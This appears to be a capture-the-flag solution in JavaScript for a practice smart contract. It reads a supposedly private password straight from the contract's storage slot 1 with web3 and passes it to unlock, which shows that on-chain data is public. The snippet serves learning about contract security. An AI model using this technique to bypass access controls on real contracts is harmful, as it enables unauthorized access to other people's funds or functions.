/**
 * contract's storage is structured in 32 bytes long blocks. 
 * At the 0 slot, there is the bool value, and at slot 1 there is the password we are looking for.
 */

let contractAddress = await contract.address;
let passwd = await web3.eth.getStorageAt(contractAddress, 1);
await contract.unlock(passwd);